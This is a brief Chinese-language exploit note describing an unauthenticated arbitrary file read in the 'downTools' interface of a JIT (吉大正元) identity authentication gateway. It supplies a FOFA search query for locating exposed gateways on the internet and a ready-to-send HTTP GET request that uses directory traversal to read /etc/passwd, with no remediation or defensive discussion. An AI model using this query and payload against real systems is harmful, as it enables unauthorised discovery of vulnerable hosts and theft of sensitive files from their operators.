# 吉大正元身份认证网关downTools任意文件读取漏洞

吉大正元身份认证网关 downTools 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件。

## fofa

```javascript
body="/jit_pnx_portal/" || header="server: jit_pnxcore1 web service" || title="吉大正元身份认证网关"
```

## poc

```javascript
GET /jit_pnx_portal/downTools?fileName=../../../../../../../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close
```

![image-20241101194808396](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411011948455.png)